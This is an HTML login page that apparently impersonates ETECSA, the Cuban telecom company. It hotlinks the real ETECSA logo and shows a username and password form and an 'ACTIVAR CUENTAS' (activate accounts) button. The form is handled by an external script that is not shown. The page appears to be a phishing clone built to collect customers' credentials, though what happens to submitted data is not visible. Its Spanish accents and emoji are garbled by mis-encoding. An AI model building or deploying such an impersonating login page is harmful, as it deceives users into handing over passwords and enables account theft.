<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login - ETECSA</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            margin: 0;
            padding: 20px;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .header {
            width: 100%;
            background: #003366;
            color: white;
            text-align: center;
            padding: 10px 0;
            position: fixed;
            top: 0;
            left: 0;
        }

        .header .logo {
            width: 50px;
            height: 50px;
            background: url('https://www.etecsa.cu/sites/default/files/logo.png') no-repeat center center;
            background-size: contain;
            display: inline-block;
            vertical-align: middle;
        }

        .header .title {
            display: inline-block;
            vertical-align: middle;
            margin-left: 10px;
            font-size: 20px;
        }

        .container {
            background: white;
            padding: 40px;
            border-radius: 15px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
            text-align: center;
            max-width: 400px;
            width: 100%;
            margin-top: 80px;
        }

        h1 {
            color: #333;
            margin-bottom: 10px;
        }

        .subtitle {
            color: #666;
            margin-bottom: 30px;
        }

        .input-group {
            margin-bottom: 20px;
        }

        input {
            width: 100%;
            padding: 12px;
            border: 2px solid #ddd;
            border-radius: 8px;
            font-size: 16px;
            transition: border-color 0.3s;
        }

        input:focus {
            border-color: #0088cc;
            outline: none;
        }

        .btn {
            background: #0088cc;
            color: white;
            border: none;
            padding: 12px 30px;
            border-radius: 8px;
            font-size: 16px;
            cursor: pointer;
            transition: background 0.3s;
        }

        .btn:hover {
            background: #006699;
        }

        .message {
            margin-top: 20px;
            padding: 10px;
            border-radius: 5px;
            display: none;
        }

        .success {
            background: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }

        .error {
            background: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }

        .activate-button {
            background: #0088cc;
            color: white;
            border: none;
            padding: 20px;
            border-radius: 15px;
            font-size: 18px;
            cursor: pointer;
            transition: background 0.3s;
            margin-top: 20px;
        }

        .activate-button:hover {
            background: #006699;
        }
    </style>
</head>
<body>
    <div class="header">
        <span class="logo"></span>
        <span class="title">ETECSA</span>
    </div>
    <div class="container">
        <h1>游니 ETECSA</h1>
        <p class="subtitle">Inicia sesi칩n para acceder a nuestros servicios</p>

        <form id="loginForm">
            <div class="input-group">
                <input type="text" id="username" placeholder="Introduce tu Usuario" required>
            </div>
            <div class="input-group">
                <input type="password" id="password" placeholder="Introduce tu Contrase침a" required>
            </div>
            <button type="submit" class="btn">游 Iniciar Sesi칩n</button>
        </form>

        <button class="activate-button">ACTIVAR CUENTAS</button>

        <div id="message" class="message"></div>
    </div>

    <script src="script.js"></script>
</body>
</html>
